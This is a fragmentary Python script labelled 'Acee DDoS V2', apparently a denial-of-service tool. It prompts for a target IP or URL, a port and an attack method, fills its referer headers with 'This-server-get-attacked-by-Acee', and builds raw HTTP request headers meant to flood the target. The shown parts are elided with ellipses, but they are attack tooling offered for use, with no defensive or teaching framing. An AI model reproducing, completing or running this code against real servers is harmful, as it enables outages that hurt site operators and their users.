...
import sys
import os
os.system('color ' +random.choice(['a'])+ " & cls & title Acee DDoS V2")
...
referers = [
     'This-server-get-attacked-by-Acee',
     'This-server-get-attacked-by-Acee',
     'This-server-get-attacked-by-Acee',
     'This-server-get-attacked-by-Acee',
     'This-server-get-attacked-by-Acee',
...
if sys.platform.startswith("linux"):
   ...
   os.system('color ' +random.choice(['5'])+ " & cls & title Acee DDoS V2 used by " + nama + "")
credit = """
...
ip = str(input(" Target Ip/Url :"))
port = int(input(" Target Port [80,443 Port website] :"))
method_attack = str(input("Methode 1 untuk target website. Methode 2 Untuk target IP. [//>] Pilih Methode [1/2]: "))
...
def Headers(method):
    ...
    if method == "get" or method == "head":
        post_host = "POST /Attacked-by-XXBR HTTP/1.1\r\nHost: " + ip + "\r\n"
